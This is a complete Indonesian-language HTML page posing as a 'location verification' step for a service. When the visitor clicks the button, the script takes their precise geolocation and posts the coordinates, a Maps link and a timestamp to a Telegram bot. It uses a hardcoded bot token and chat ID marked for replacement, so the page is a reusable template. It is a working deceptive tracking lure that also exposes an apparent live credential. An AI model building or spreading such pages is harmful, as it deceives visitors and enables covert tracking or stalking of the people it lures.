<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verifikasi Lokasi</title>

<style>
    body {
        margin: 0;
        background: #0a0a0f;
        color: #eaeaff;
        font-family: system-ui, sans-serif;
        height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
    }

    .box {
        text-align: center;
        padding: 26px 28px;
        background: rgba(20, 20, 35, 0.58);
        border: 1px solid rgba(120, 60, 255, 0.25);
        border-radius: 14px;
        width: 280px;
    }

    h2 {
        margin: 0 0 12px;
        font-size: 17px;
        font-weight: 600;
        color: #c8b8ff;
    }

    p {
        margin: 0 0 18px;
        font-size: 13px;
        color: #b9b1d9;
    }

    button {
        width: 100%;
        padding: 10px 0;
        border-radius: 8px;
        border: none;
        font-size: 14px;
        cursor: pointer;
        transition: 0.2s;
        background: linear-gradient(90deg,#8b4bff,#b36bff);
        color: white;
        font-weight: 600;
    }

    button:active {
        transform: scale(0.97);
        opacity: 0.8;
    }

    .small {
        font-size: 12px;
        margin-top: 10px;
        opacity: 0.65;
    }
</style>

</head>
<body>

<div class="box">
    <h2>Verifikasi Lokasi</h2>
    <p>Untuk memastikan layanan berjalan optimal, sistem memerlukan informasi lokasi Anda.
            Tekan tombol di bawah untuk mengirimkan lokasi dengan aman.</p>

    <button onclick="sendLocation()">Bagikan Lokasi</button>

    <div class="small" id="status">Menunggu aksi‚Ä¶</div>
</div>


<script>
function sendLocation() {
    const status = document.getElementById("status");
    status.textContent = "Mengambil lokasi...";

    if (!navigator.geolocation) {
        status.textContent = "Geolocation tidak tersedia.";
        return;
    }

    navigator.geolocation.getCurrentPosition(success, error, {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
    });
}

function success(pos) {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;

    const bot = "8565552587:AAFSJysYHitKWugVSHgcu1tymRF1pOSMEQg";   // GANTI
    const chatId = "8012228867";  // GANTI

    const now = new Date();
    const date = now.toLocaleDateString("id-ID");
    const time = now.toLocaleTimeString("id-ID");

    const text =
`üìç *Lokasi Terkini Terkirim*

‚Ä¢ üåê Koordinat:
   - Latitude: ${lat}
   - Longitude: ${lon}

‚Ä¢ üó∫Ô∏è Google Maps:
   https://www.google.com/maps?q=${lat},${lon}

‚Ä¢ üìÖ Tanggal: ${date}
‚Ä¢ ‚è∞ Waktu: ${time}

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
Dikirim otomatis melalui sistem lokasi.`;

    fetch(`https://api.telegram.org/bot${bot}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: text,
            parse_mode: "Markdown"
        })
    });

    document.getElementById("status").textContent = "Lokasi berhasil dikirim!";
}

function error(err) {
    document.getElementById("status").textContent =
        "Gagal mendapatkan lokasi: " + err.message;
}
</script>

</body>
</html>
